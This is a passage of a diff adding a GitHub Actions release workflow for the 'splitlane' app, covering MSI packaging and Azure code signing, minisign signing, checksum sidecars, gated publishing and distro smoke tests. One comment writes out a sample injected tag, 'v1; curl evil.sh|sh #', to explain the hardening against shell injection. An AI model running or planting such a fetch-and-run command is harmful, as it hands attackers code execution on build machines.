+          # `build` as the positional INPUT (a Cargo.toml/.wxs path), which
+          # does not exist -> `Error[3] (Io): The 'build' path does not exist`.
+          # `--target` still MUST be passed explicitly: cargo-wix 0.3.x resolves
+          # the binary path from this flag
+          # (target/x86_64-pc-windows-msvc/release/splitlane.exe), NOT from a
+          # `CARGO_BUILD_TARGET` env var.
+          # cargo-wix 0.3.9 does NOT read a `wxs` key from
+          # [package.metadata.wix] (verified against create.rs) - it only
+          # auto-discovers `<package>/wix/*.wxs`, i.e. src-app/wix/, which does
+          # not exist here -> `Error[2]: There are no WXS files`. Point it at
+          # the real source explicitly with --include. Path is relative to the
+          # CWD (repo root in the checkout).
+          # --nocapture surfaces candle/light output (otherwise cargo-wix
+          # swallows LGHT/CNDL errors). The .wxs references License.rtf and
+          # splitlane.ico, which light resolves from the CWD (repo root), so
+          # they carry the packaging/wix/ prefix in main.wxs.
+          cargo wix `
+            --nocapture `
+            --no-build `
+            --package splitlane-app `
+            --target x86_64-pc-windows-msvc `
+            --install-version $version `
+            --include packaging/wix/main.wxs
+          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+          Get-ChildItem -LiteralPath target/wix
+
+      # ─── Sign MSI via Azure Trusted Signing ───────────────────────────────────
+      # Invokes `scripts/sign-windows.ps1`, which fetches the
+      # `Microsoft.ArtifactSigning.Client` NuGet (pinned 1.0.128) into a
+      # temp dir, writes a metadata.json with ExcludeCredentials, and
+      # calls `signtool.exe sign` with the 3-host timestamp retry chain
+      # (acs.microsoft.com → digicert → sectigo).
+      # Verification (`signtool verify /pa` + `Get-AuthenticodeSignature`)
+      # is embedded in the script; an additional standalone verify step
+      # below makes it visible at the workflow level.
+      #
+      # Why script-not-action: the official
+      # `azure/trusted-signing-action` is a thin wrapper around the same
+      # `Microsoft.ArtifactSigning.Client` NuGet, but accepts only ONE
+      # `timestamp-rfc3161` URL - it cannot provide the 3-server
+      # fallback chain. The script invokes the same official Microsoft
+      # client at a lower level (signtool /dlib), and is therefore the
+      # canonical Azure Trusted Signing integration here.
+      #
+      # Secrets (all 6 required):
+      #   AZURE_TENANT_ID / AZURE_CLIENT_ID / AZURE_CLIENT_SECRET
+      #       - service principal for EnvironmentCredential auth
+      #   AZURE_TRUSTED_SIGNING_ENDPOINT / _ACCOUNT / _CERT_PROFILE
+      #       - addressing for the code-signing account / cert profile
+      #
+      # When `signing_available` is false the Windows leg still
+      # builds, tests, and lints, but skips MSI packaging/signing/staging.
+      # The banner step below records that no Windows installer was
+      # published. We do not ship unsigned Windows installers.
+      - name: Sign MSI
+        id: sign_msi
+        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
+        shell: pwsh
+        env:
+          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
+          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
+          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
+          AZURE_TRUSTED_SIGNING_ENDPOINT: ${{ secrets.AZURE_TRUSTED_SIGNING_ENDPOINT }}
+          AZURE_TRUSTED_SIGNING_ACCOUNT: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
+          AZURE_TRUSTED_SIGNING_CERT_PROFILE: ${{ secrets.AZURE_TRUSTED_SIGNING_CERT_PROFILE }}
+          # The O= (Organization) the signature must carry. A repository
+          # VARIABLE, not a secret - it is printed in the log on failure and
+          # is the publisher name users see, so it is not confidential. The
+          # script HARD-FAILS if it is empty rather than skipping the check.
+          SPLITLANE_EXPECTED_SIGNER_ORG: ${{ vars.SPLITLANE_EXPECTED_SIGNER_ORG }}
+          TAG: ${{ env.RELEASE_TAG }}
+        run: |
+          $version = $env:TAG -replace '^v', ''
+          # Hard-validate $version as strict semver before it flows into
+          # a glob pattern. github.ref_name is attacker-controlled; a
+          # tag like `v1.0.0*;evil` would produce a malformed glob. This
+          # doesn't enable command injection (Get-ChildItem -Filter is
+          # not an eval surface), but a crafted tag could match the
+          # wrong MSI or skip signing silently. Belt-and-suspenders.
+          if ($version -notmatch '^\d+\.\d+\.\d+([.-][0-9A-Za-z.-]+)?$') {
+              throw "TAG '$env:TAG' does not strip to a valid semver (got '$version'). Refusing to glob for MSI."
+          }
+          $candidates = @(Get-ChildItem -Path 'target/wix' -Filter 'splitlane-*.msi' -File)
+          if ($candidates.Count -ne 1) {
+              $names = if ($candidates.Count -gt 0) { ($candidates | ForEach-Object { $_.Name }) -join ', ' } else { '<none>' }
+              throw "Expected exactly one MSI under target/wix/ after cargo wix, found $($candidates.Count): $names"
+          }
+          $msi = $candidates[0].FullName
+          Write-Output "Signing: $msi"
+          # Quoted "$msi" so a path with spaces (unlikely with cargo-wix
+          # defaults but defensive) is passed as one argv element.
+          pwsh -NoProfile -File ./scripts/sign-windows.ps1 -InputFile "$msi"
+
+      # ─── Verify MSI signature at workflow level ──────────────────────────
+      # `sign-windows.ps1` already runs `signtool verify /pa /v` + an
+      # `Get-AuthenticodeSignature` Authenticode check internally - this
+      # step re-runs the bare `signtool verify /pa /v` so the verification
+      # output is unambiguously visible at the workflow level (the
+      # script's verify is buried inside its log section). The check demands
+      # the literal "Successfully verified" string; we grep for it and
+      # fail the step if absent.
+      # Explicit `steps.sign_msi.outcome == 'success'` guard alongside the
+      # implicit `success()` default: belt-and-braces against a future
+      # editor adding `continue-on-error: true` to the Sign MSI step,
+      # which would let `success()` evaluate true after a sign failure
+      # and run Verify against an unsigned artifact.
+      - name: Verify MSI signature
+        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true' && steps.sign_msi.outcome == 'success'
+        shell: pwsh
+        env:
+          TAG: ${{ env.RELEASE_TAG }}
+        run: |
+          $version = $env:TAG -replace '^v', ''
+          if ($version -notmatch '^\d+\.\d+\.\d+([.-][0-9A-Za-z.-]+)?$') {
+              throw "TAG '$env:TAG' does not strip to a valid semver (got '$version')."
+          }
+          $candidates = @(Get-ChildItem -Path 'target/wix' -Filter 'splitlane-*.msi' -File)
+          if ($candidates.Count -ne 1) {
+              $names = if ($candidates.Count -gt 0) { ($candidates | ForEach-Object { $_.Name }) -join ', ' } else { '<none>' }
+              throw "Expected exactly one MSI under target/wix/ after cargo wix, found $($candidates.Count): $names"
+          }
+          $msi = $candidates[0].FullName
+
+          # Resolve signtool the same way sign-windows.ps1 does - keep
+          # the two paths in sync so a runner-image SDK change cannot
+          # silently desynchronize them.
+          $sdkRoot = 'C:\Program Files (x86)\Windows Kits\10\bin'
+          $signtool = $null
+          if (Test-Path -LiteralPath $sdkRoot) {
+              $signtool = Get-ChildItem -Path $sdkRoot -Recurse -Filter 'signtool.exe' -ErrorAction SilentlyContinue |
+                  Where-Object { $_.FullName -match '\\x64\\' } |
+                  Sort-Object { try { [version]$_.Directory.Parent.Name } catch { [version]'0.0.0.0' } } -Descending |
+                  Select-Object -First 1 -ExpandProperty FullName
+          }
+          if ([string]::IsNullOrEmpty($signtool)) {
+              $onPath = Get-Command -Name signtool.exe -ErrorAction SilentlyContinue
+              if ($null -ne $onPath) { $signtool = $onPath.Source }
+          }
+          if ([string]::IsNullOrEmpty($signtool)) {
+              throw "signtool.exe not found."
+          }
+
+          Write-Output "Verifying: $msi"
+          # Capture stdout+stderr so we can grep for the success sentinel.
+          # 2>&1 routes signtool's diagnostic output (which goes to
+          # stderr) into the same stream as the success line.
+          $verifyOutput = & $signtool verify /pa /v "$msi" 2>&1
+          $verifyExit = $LASTEXITCODE
+          $verifyOutput | ForEach-Object { Write-Output $_ }
+          if ($verifyExit -ne 0) {
+              throw "signtool verify exit code $verifyExit"
+          }
+          # Anchor the regex with `^\s*` so the success sentinel must appear
+          # as its own line (signtool emits "    Successfully verified:
+          # <path>" with leading whitespace). A bare substring match could
+          # in theory be tricked by a future signtool diagnostic that
+          # echoes the phrase mid-sentence in an error path.
+          if (-not ($verifyOutput -match '^\s*Successfully verified')) {
+              throw "signtool verify did not emit 'Successfully verified' - success sentinel missing."
+          }
+          Write-Output "Sentinel 'Successfully verified' present."
+
+      # ─── Record skipped Windows MSI packaging in job summary ────────────
+      # When the Azure secrets aren't populated, the entire MSI chain
+      # (Preflight WiX → Install cargo-wix → Produce MSI → Sign → Verify
+      # → Stage) is gated off. The leg still validates Windows code via
+      # cargo fmt / clippy / test / Build release binary, but produces
+      # no .msi artifact. This banner makes that visible in the run
+      # summary so a release reviewer doesn't wonder where the MSI went.
+      - name: Record skipped Windows MSI packaging in job summary
+        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available != 'true'
+        shell: bash
+        env:
+          ARCH: ${{ matrix.arch }}
+          TAG: ${{ env.RELEASE_TAG }}
+        run: |
+          set -euo pipefail
+          {
+              echo "## ℹ️ Windows MSI packaging skipped (${ARCH}, ${TAG})"
+              echo
+              echo "One or more AZURE_* secrets were missing, so this leg ran"
+              echo "**only the build/test/clippy validation** for Windows and produced"
+              echo "no \`.msi\` artifact. This is intentional: we don't ship"
+              echo "unsigned Windows installers."
+              echo
+              echo "Required secrets: \`AZURE_TENANT_ID\`, \`AZURE_CLIENT_ID\`,"
+              echo "\`AZURE_CLIENT_SECRET\`, \`AZURE_TRUSTED_SIGNING_ENDPOINT\`,"
+              echo "\`AZURE_TRUSTED_SIGNING_ACCOUNT\`, \`AZURE_TRUSTED_SIGNING_CERT_PROFILE\`."
+              echo
+              echo "Once populated, the MSI chain re-activates automatically"
+              echo "with no other workflow change."
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # ─── Stage the signed MSI + SHA-256 sidecar ──────────────────────────
+      # Rename from cargo-wix's default (splitlane-<ver>-x86_64.msi) to the
+      # canonical release asset name splitlane-<ver>-x86_64-pc-windows-msvc.msi
+      # that `update_checker::pick_asset` matches against. The
+      # `-pc-windows-msvc` suffix is the Rust triple, kept in the filename
+      # so the in-app updater's asset picker can key on the triple without
+      # an explicit per-OS branch.
+      #
+      # Same env-routing hardening as the Linux/macOS stage steps: `TAG`
+      # goes via the `env:` block, never inlined as `${{ ... }}` inside
+      # the shell body - so an attacker-controlled tag cannot shell-inject.
+      - name: Stage Windows assets
+        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
+        shell: bash
+        env:
+          TAG: ${{ env.RELEASE_TAG }}
+        run: |
+          set -euo pipefail
+          mkdir -p release-assets
+          version="${TAG#v}"
+          # cargo-wix normalizes prerelease versions in the emitted MSI
+          # filename (for example 0.6.4-rc.1 -> 0.6.4.1), so resolve the
+          # single produced MSI independently from the canonical release
+          # asset name below.
+          shopt -s nullglob
+          matches=( target/wix/splitlane-*.msi )
+          shopt -u nullglob
+          if [ "${#matches[@]}" -ne 1 ]; then
+              printf '::error::Expected exactly one MSI under target/wix/, found %s: %s\n' "${#matches[@]}" "${matches[*]:-<none>}" >&2
+              exit 1
+          fi
+          src="${matches[0]}"
+          dst="splitlane-${version}-x86_64-pc-windows-msvc.msi"
+          provenance_src="target/libghostty-windows-release/provenance.json"
+          provenance_dst="splitlane-${version}-x86_64-pc-windows-msvc.libghostty-provenance.json"
+          if [ ! -s "${provenance_src}" ]; then
+              echo "::error::Missing Windows libghostty provenance report at ${provenance_src}" >&2
+              exit 1
+          fi
+          cp "${src}" "release-assets/${dst}"
+          cp "${provenance_src}" "release-assets/${provenance_dst}"
+          ( cd release-assets \
+            && sha256sum "${dst}" > "${dst}.sha256" \
+            && sha256sum "${provenance_dst}" > "${provenance_dst}.sha256" )
+          ls -la release-assets/
+
+      # --- Stage all 4 artifacts with canonical names ---
+      # Linux-leg-only: the macOS .dmg is staged by its own step above.
+      # Context values are passed via `env:` rather than inlined as
+      # `${{ github.ref_name }}` inside the shell body - otherwise an
+      # attacker-controlled tag like `v1; curl evil.sh|sh #` would be
+      # shell-injected when bash parses the script. `env:` injects them
+      # as environment variables, immune to shell interpretation.
+      - name: Stage release assets
+        if: runner.os == 'Linux'
+        env:
+          TAG: ${{ env.RELEASE_TAG }}
+          ARCH: ${{ matrix.arch }}
+          TARGET: ${{ matrix.target }}
+        # `VERSION="${TAG#v}"` strips the leading `v` so all Linux assets
+        # are named `splitlane-<semver>-<arch>.<ext>` (no `v` prefix),
+        # aligning with the macOS DMG and Windows MSI naming conventions
+        # already in this workflow. The invariant we MUST preserve is the
+        # filename suffix `-<arch>.<ext>`. That's what
+        # `update_checker.rs::pick_asset` matches on
+        # (`a.name.to_ascii_lowercase().ends_with("-x86_64.deb")` etc.),
+        # so dropping the `v` from the prefix is safe for v0.2.x clients
+        # auto-updating to v0.3.0+.
+        run: |
+          set -euo pipefail
+          VERSION="${TAG#v}"
+          mkdir -p release-assets
+          cp "target/bundle/splitlane-${VERSION}-${ARCH}.tar.gz"            "release-assets/"
+          cp "target/appimage/splitlane-${VERSION}-${ARCH}.AppImage"        "release-assets/"
+          cp "target/appimage/splitlane-${VERSION}-${ARCH}.AppImage.zsync"  "release-assets/"
+          # cargo-deb names the file from crate version + revision + the
+          # Debian arch tag derived from the target triple
+          # (e.g. splitlane_0.3.0-1_amd64.deb on x86_64,
+          #  splitlane_0.3.0-1_arm64.deb on aarch64). Rename to the canonical
+          # splitlane-<version>-<arch>.deb form the GitHub release uses. The
+          # target-scoped directory keeps the glob unambiguous per matrix
+          # leg.
+          cp target/"${TARGET}"/debian/splitlane_*.deb \
+             "release-assets/splitlane-${VERSION}-${ARCH}.deb"
+          # cargo-generate-rpm names the file from crate version + release +
+          # rpm arch tag (e.g. splitlane-0.3.0-1.x86_64.rpm,
+          # splitlane-0.3.0-1.aarch64.rpm). Rename to the canonical
+          # splitlane-<version>-<arch>.rpm form so `update_checker::pick_asset`
+          # can match it (the asset picker matches on `-${arch}.rpm`).
+          cp target/"${TARGET}"/generate-rpm/splitlane-*.rpm \
+             "release-assets/splitlane-${VERSION}-${ARCH}.rpm"
+          # Emit SHA-256 siblings for every primary Linux artifact.
+          # Rationale:
+          #   - `.tar.gz` → consumed by the in-app updater, which
+          #     fetches `<asset>.sha256` and verifies the download before
+          #     swapping `$HOME/.local/splitlane.app/`.
+          #   - `.deb` / `.rpm` / `.AppImage` → out-of-band
+          #     verification by downstream mirrors, security scanners, and
+          #     users downloading artifacts directly from GitHub Releases.
+          #
+          # `test -s` guards catch the pathological case where an earlier
+          # `cp` silently produced a zero-byte file (e.g. disk pressure on
+          # the runner). Without them, `sha256sum` would happily hash an
+          # empty file and publish a valid-but-wrong sidecar. `sha256sum`
+          # itself is part of coreutils on ubuntu-22.04; it is always
+          # present.
+          #
+          # Staying inside a single `cd release-assets` subshell keeps the
+          # canonical coreutils output format `<64-hex>  <filename>` (no
+          # path prefix) - essential for `sha256sum -c <asset>.sha256` to
+          # work after a user downloads both files into the same directory.
+          # `set -e` / `set -o pipefail` are inherited by the subshell, so
+          # any single `sha256sum` failure aborts the chain and fails the
+          # whole step rather than publishing a partial sidecar set.
+          for art in \
+              "splitlane-${VERSION}-${ARCH}.tar.gz" \
+              "splitlane-${VERSION}-${ARCH}.AppImage" \
+              "splitlane-${VERSION}-${ARCH}.deb" \
+              "splitlane-${VERSION}-${ARCH}.rpm"
+          do
+              if [ ! -s "release-assets/${art}" ]; then
+                  echo "::error::release-assets/${art} is missing or empty, refusing to hash." >&2
+                  exit 1
+              fi
+          done
+          ( cd release-assets \
+            && sha256sum "splitlane-${VERSION}-${ARCH}.tar.gz" \
+                 > "splitlane-${VERSION}-${ARCH}.tar.gz.sha256" \
+            && sha256sum "splitlane-${VERSION}-${ARCH}.AppImage" \
+                 > "splitlane-${VERSION}-${ARCH}.AppImage.sha256" \
+            && sha256sum "splitlane-${VERSION}-${ARCH}.deb" \
+                 > "splitlane-${VERSION}-${ARCH}.deb.sha256" \
+            && sha256sum "splitlane-${VERSION}-${ARCH}.rpm" \
+                 > "splitlane-${VERSION}-${ARCH}.rpm.sha256" )
+          ls -la release-assets/
+
+      # Upload artifacts so the smoke-test jobs below can install them
+      # in clean Ubuntu / Fedora containers. `compression-level: 0`
+      # - artifacts are already compressed (.deb/.rpm/.tar.gz/.AppImage).
+      - name: Verify release artifacts staged
+        run: |
+          set -euo pipefail
+          if [ ! -d release-assets ] || ! find release-assets -maxdepth 1 -type f | grep -q .; then
+            if [ "${RELEASE_MODE}" = "dry-run" ]; then
+              echo "::warning::No release artifacts were staged for ${RUNNER_OS}. Dry-run upload will be empty."
+              exit 0
+            fi
+            echo "::error::No release artifacts were staged for ${RUNNER_OS} in release mode."
+            exit 1
+          fi
+
+      - name: Upload release artifacts (for smoke-test jobs)
+        uses: actions/upload-artifact@v4
+        with:
+          # Include runner.os in the artifact name because Linux
+          # aarch64 and macOS aarch64 would otherwise collide on
+          # `release-assets-aarch64`. The publish + smoke jobs glob
+          # `release-assets-*`, so the new pattern is compatible.
+          name: release-assets-${{ matrix.arch }}-${{ runner.os }}
+          path: release-assets/
+          retention-days: 7
+          compression-level: 0
+
+  # ─── Unified release publish ────────────────────────────────────────
+  # `build` is a matrix (x86_64 + aarch64). Calling
+  # softprops/action-gh-release from each matrix leg would race two
+  # concurrent API writers against the same tag: two "create release"
+  # calls, two `generate_release_notes: true` bodies, overlapping
+  # asset uploads. Instead, every matrix leg only uploads its
+  # `release-assets-<arch>` workflow artifact; this single job runs
+  # after ALL legs finish, downloads every artifact, and creates the
+  # GitHub Release exactly once with the merged file set.
+  #
+  # Atomic-release guarantee: the publish job `needs:` list
+  # waits for the full build matrix plus every release smoke gate. A
+  # failed Linux x64, Linux aarch64, macOS aarch64, Windows x64, package
+  # smoke, MSI smoke, or auto-update E2E blocks publishing.
+  release:
+    name: Publish GitHub Release
+    # Skip the entire publish chain in dry-run mode. The
+    # the downstream `update_cask.yml` workflow is triggered by workflow_run
+    # and now requires a successful release workflow, so skipping/failing this
+    # job transitively skips it. Winget manifests are manual templates until
+    # a dedicated winget-pkgs PR workflow is restored. The APT/RPM
+    # repository publish workflow is disabled until this product has a
+    # package domain of its own; it filtered on
+    # `workflow_run.event == 'push'`, so a workflow_dispatch run would
+    # never have reached it.
+    # NOTE: GitHub Actions does NOT expose the `env` context in job-level
+    # `if:` expressions (only in step-level `if:`, in `with:`/`env:` of
+    # steps, and in `continue-on-error:`). Use `github.event_name` +
+    # `github.ref` directly. The `startsWith(...)` belt is required even
+    # though the workflow's only `push` trigger is `tags: ["v*"]` -
+    # without it, any future addition of a `push: branches:` trigger
+    # (e.g. for nightly artifacts) would silently start publishing real
+    # GitHub Releases off branch pushes. Defence in depth, mirrors the
+    # canonical pattern used by rust-lang/rust, tokio-rs/tokio, and Zed
+    # (zed-industries/zed .github/workflows/release.yml).
+    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
+    # Publish is gated on every release validation job, not just
+    # `build`. If any smoke test fails, the GitHub Release must not publish.
+    # Also gated on `auto-update-e2e` so a tag cut never ships a
+    # binary that can't actually self-update v(N-1) → v(N).
+    # Previously the smoke jobs ran in parallel with publish (rationale:
+    # the .deb/.rpm hadn't been signed yet, so a hot-fix re-publish was
+    # cheaper than blocking the tag). Post-v0.2.11 the macOS DMG is
+    # notarized and the Windows MSI is in the Azure-signing pipeline,
+    # so a botched-postinst hot-fix means re-running the entire signing
+    # chain. Blocking publish on every smoke gate is the cheaper and more
+    # honest failure mode now. `dry-run-summary` is intentionally excluded:
+    # it only runs for workflow_dispatch dry-runs, never for tag-push
+    # release publishing.
+    needs:
+      - build
+      - smoke-test-ubuntu
+      - smoke-test-fedora
+      - smoke-test-debian
+      - smoke-test-opensuse
+      - smoke-test-arch
+      - smoke-test-windows-msi
+      - auto-update-e2e
+    runs-on: ubuntu-22.04
+    # Gate the publish job (which holds the
+    # minisign signing key) behind the `release` environment, so the private
+    # key can be an *environment* secret with optional required-reviewer
+    # protection rather than a bare repo secret. GitHub auto-creates the
+    # environment unprotected on first run; add reviewers in repo settings to
+    # require manual approval before a tag is signed + published.
+    environment: release
+    permissions:
+      contents: write
+    steps:
+      - name: Download all release artifacts
+        # `pattern` globs every `release-assets-*` workflow artifact
+        # (x86_64 + aarch64 today, more later). `merge-multiple: true`
+        # flattens them into a single directory so `files: release-assets/*`
+        # picks up every built asset.
+        uses: actions/download-artifact@v4
+        with:
+          path: release-assets
+          pattern: release-assets-*
+          merge-multiple: true
+
+      - name: Verify merged release artifacts
+        run: |
+          set -euo pipefail
+          if [ ! -d release-assets ] || ! find release-assets -maxdepth 1 -type f | grep -q .; then
+            echo "::error::No release artifacts were downloaded. Refusing to create an empty GitHub Release."
+            exit 1
+          fi
+
+      # Sign every shipped artifact with the project minisign key so
+      # clients can verify downloads against the public key baked into their
+      # binary (update/signature.rs). The detached `.minisig` siblings are
+      # picked up by `files: release-assets/*` below. Missing key is a hard
+      # release failure: clients with embedded keys verify fail-closed, so an
+      # unsigned release would publish unusable self-update assets.
+      - name: Sign release artifacts (minisign)
+        env:
+          MINISIGN_SECRET_KEY: ${{ secrets.MINISIGN_SECRET_KEY }}
+        run: |
+          set -euo pipefail
+          if [ -z "${MINISIGN_SECRET_KEY}" ]; then
+            echo "::error::MINISIGN_SECRET_KEY is required. Clients with an embedded key refuse unsigned self-update assets."
+            exit 1
+          fi
+          # minisign is NOT packaged in Ubuntu 22.04 (jammy) - it only enters
+          # the archive in 24.04 (noble, universe). Install the upstream
+          # static binary instead, pinned by version + SHA-256 so the signing
+          # toolchain itself is tamper-evident (first executed 2026-06-10;
+          # the apt path had never run while the secret was unprovisioned).
+          MINISIGN_VERSION=0.12
+          MINISIGN_SHA256=9a599b48ba6eb7b1e80f12f36b94ceca7c00b7a5173c95c3efc88d9822957e73
+          curl -sSfL --retry 3 -o /tmp/minisign.tar.gz \
+            "https://github.com/jedisct1/minisign/releases/download/${MINISIGN_VERSION}/minisign-${MINISIGN_VERSION}-linux.tar.gz"
+          echo "${MINISIGN_SHA256}  /tmp/minisign.tar.gz" | sha256sum -c -
+          tar -xzf /tmp/minisign.tar.gz -C /tmp
+          sudo install -m 0755 /tmp/minisign-linux/x86_64/minisign /usr/local/bin/minisign
+          minisign -v
+          # Unencrypted secret key (generated with `minisign -G -W`) written to
+          # a private temp file; the GitHub secret is the only protection.
+          key_file="$(mktemp)"
+          trap 'rm -f "$key_file"' EXIT
+          printf '%s\n' "${MINISIGN_SECRET_KEY}" > "$key_file"
+          chmod 600 "$key_file"
+          shopt -s nullglob
+          for f in release-assets/*; do
+            # Skip checksum / signature / zsync siblings - only the primary
+            # artifacts (.tar.gz/.deb/.rpm/.AppImage/.dmg/.msi) are signed.
+            case "$f" in
+              *.sha256|*.minisig|*.zsync) continue ;;
+            esac
+            [ -f "$f" ] || continue
+            base="$(basename "$f")"
+            # Trusted comment binds the artifact name into the signed payload.
+            minisign -S -s "$key_file" -m "$f" \
+              -t "splitlane release artifact ${base}" >/dev/null
+            echo "signed: ${base} -> ${base}.minisig"
+          done
+
+      - name: Create GitHub Release
+        uses: softprops/action-gh-release@v2
+        with:
+          files: release-assets/*
+          generate_release_notes: true
+          # Keep the release hidden from /releases/latest until every signed
+          # asset is attached. The updater fetches <asset>.minisig and fails
+          # closed, so exposing a half-populated release can look like a
+          # tampered Windows MSI to clients that click Update immediately.
+          draft: true
+          prerelease: ${{ contains(env.RELEASE_TAG, 'alpha') || contains(env.RELEASE_TAG, 'beta') || contains(env.RELEASE_TAG, 'rc') }}
+
+      - name: Verify uploaded release asset set
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          local_assets="$(mktemp)"
+          remote_assets="$(mktemp)"
+          trap 'rm -f "$local_assets" "$remote_assets"' EXIT
+
+          find release-assets -maxdepth 1 -type f -printf '%f\n' | sort > "$local_assets"
+          gh release view "${RELEASE_TAG}" \
+            --json assets \
+            --jq '.assets[].name' \
+            | sort > "$remote_assets"
+
+          if ! diff -u "$local_assets" "$remote_assets"; then
+            echo "::error::Uploaded release assets do not match signed local artifacts."
+            exit 1
+          fi
+
+      - name: Publish GitHub Release after asset verification
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          gh release edit "${RELEASE_TAG}" --draft=false
+
+  # ─── Smoke tests (multi-distro) ─────────────────────────────────────
+  # Exercise the postinst scripts and packaged binary in clean distro
+  # containers to catch (a) the Cursor-style "broken apt update"
+  # regression, and (b) cross-distro library/
+  # naming drift.
+  #
+  # 5-distro matrix (kept as 5 sibling top-level jobs rather than a
+  # `matrix:` strategy because each distro has a different package
+  # manager + assertion set; flattening them into one matrix would
+  # require a per-distro switch ladder that erases the per-distro
+  # signal a reviewer needs at a glance):
+  #   - Ubuntu 22.04         .deb postinst (deep checks: splitlane.list, idempotency)
+  #   - Fedora 40            .rpm %post     (deep checks: splitlane.repo, idempotency)
+  #   - Debian 12 bookworm   .deb install + splitlane --version
+  #   - openSUSE Tumbleweed  .rpm install via zypper
+  #   - Arch Linux           tar.gz install + splitlane --version
+  #
+  # The Arch leg installs from the platform-agnostic `.tar.gz` rather
+  # than a native PKGBUILD because Splitlane has no AUR maintainer
+  # today. It
+  # still exercises the same regression surface that matters for
+  # rolling distros: a binary built on ubuntu-22.04 (glibc 2.35) must
+  # still load on Arch's current libxcb / libxkbcommon / libvulkan.
+  #
+  # `fail-fast: false` behaviour comes from these jobs being separate
+  # top-level jobs - GHA never cancels sibling top-level jobs on a
+  # peer's failure, so a Debian fail still surfaces the openSUSE
+  # result. Inside each step, transient package-manager fetches are
+  # wrapped in a small 3-attempt retry loop to absorb
+  # the dominant failure mode (mirror flakes, not container pulls;
+  # GHA pulls the container before the first step and has no native
+  # retry knob).
+  #
+  # Publish gating: all release smokes sit in the
+  # `release.needs:` list above, so a smoke failure on any distro or on
+  # Windows blocks the GitHub Release publish and the downstream
+  # package-manager update jobs that fan out from it.
+  #
+  # Smoke tests are intentionally x86_64-only even with
+  # the aarch64 build matrix leg. The tests exercise postinst scripts
+  # (shell-only, arch-agnostic) - extending them to aarch64 would buy
+  # no additional coverage over the x86_64 run. Real aarch64
+  # installation-and-runtime validation is out of scope here (on-device
+  # tests on a Raspberry Pi 5 / Asahi Linux).
+
+  smoke-test-ubuntu:
+    name: Smoke test - Ubuntu 22.04 (.deb postinst)
+    needs: build
+    runs-on: ubuntu-22.04
+    container: ubuntu:22.04
+    # ubuntu:22.04's default /bin/sh is dash, which does NOT support
+    # `set -o pipefail`. v0.2.1 retry #3 failed at step 1 with
+    # `/tmp/XXX.sh: 1: set: Illegal option -o pipefail` before reaching
+    # any Splitlane logic. Pin bash at the job level so every step uses
+    # a POSIX-extension-supporting shell by default.
+    defaults:
+      run:
+        shell: bash
+    steps:
+      - name: Install baseline tools
+        # `apt-get install` inside the container - not the host runner.
+        # `ca-certificates` is required by APT for the https repo smoke.
+        env:
+          DEBIAN_FRONTEND: noninteractive
+        run: |
+          set -euo pipefail
+          apt-get update -qq
+          apt-get install -y --no-install-recommends \
+            ca-certificates
+
+      - name: Download built .deb
+        uses: actions/download-artifact@v4
+        with:
+          # Artifact name carries runner.os to avoid Linux/macOS
+          # aarch64 name collisions. Linux-x86_64 leg uploads to this
+          # exact name.
+          name: release-assets-x86_64-Linux
+          path: ./release-assets
+
+      - name: Install splitlane.deb (exercises postinst)
+        env:
+          DEBIAN_FRONTEND: noninteractive
+        run: |
+          set -euo pipefail
+          # `apt install` resolves runtime deps automatically - `dpkg -i`
+          # would leave them unconfigured and force a follow-up `apt -f`.
+          apt-get install -y --no-install-recommends ./release-assets/splitlane-*.deb
+
+      - name: Assert postinst wrote no apt source
+        # The inverse of the assertion that stood here until the rename.
+        # `postinst` used to write an apt source under the package's
+        # previous name, pointing at a host that belongs to the upstream
+        # project this one was forked from; it writes no source at all now
+        # (packaging/debian/postinst says why). This checks the removal
+        # stayed removed - a re-introduced line would subscribe every
+        # installing machine to somebody else's update channel, and nothing
+        # else in CI would notice.
+        run: |
+          set -euo pipefail
+          # Both names on purpose. The removed line was written under the old
+          # product name, so a restored-from-history postinst would bring back
+          # the old-named list, not `splitlane.list` - an assertion that only knew
+          # the new name would pass while the old channel was back.
+          ! ls /etc/apt/sources.list.d/ | grep -qiE 'paneflow|splitlane'
+
+      - name: Assert `apt update` completes without error (Cursor regression)
+        # Requirement: `sudo apt update must complete without error` - modern apt
+        # exits 0 even if individual sources 404, emitting `W:` warnings.
+        # A non-zero exit would mean the postinst wrote a MALFORMED
+        # sources line that broke the apt parser - the Cursor failure
+        # mode. Exit code is the test.
+        run: |
+          set -euo pipefail
+          apt-get update
+
+      - name: Assert splitlane visible via apt-cache policy
+        run: |
+          set -euo pipefail
+          # `apt-cache policy splitlane` prints `Installed: <version>` - our
+          # crate version starts with 0 (0.1.x today) but the match must
+          # not depend on that. Accept any digit-led version string.
+          # Also use `dpkg-query` as a belt-and-braces check that catches
+          # the case where apt-cache silently reports `(none)`.
+          #
+          # Capture-then-grep via here-strings instead of a pipe. Under
+          # `set -o pipefail`, `apt-cache policy | grep -q` can flake
+          # with exit 141 (SIGPIPE): grep closes its stdin as soon as
+          # the first match is found, and apt-cache's multi-line output
+          # gets SIGPIPE on its next write, which pipefail propagates as
+          # a pipeline failure. Observed in the v0.2.3 release smoke
+          # test. Here-strings have no writer process, so there is no
+          # SIGPIPE surface - the input is a fully-materialised string
+          # handed to grep's stdin before grep runs. dpkg-query output
+          # is one line and has never been observed to flake, but we
+          # switch it to the same pattern for consistency.
+          policy=$(apt-cache policy splitlane)
+          grep -Eq '^  Installed: [0-9]' <<< "$policy"
+          status=$(dpkg-query -W -f='${Status}' splitlane)
+          grep -q 'install ok installed' <<< "$status"
+
+      - name: Idempotency - pre-existing splitlane.list is not overwritten
+        env:
+          DEBIAN_FRONTEND: noninteractive
+        run: |
+          set -euo pipefail
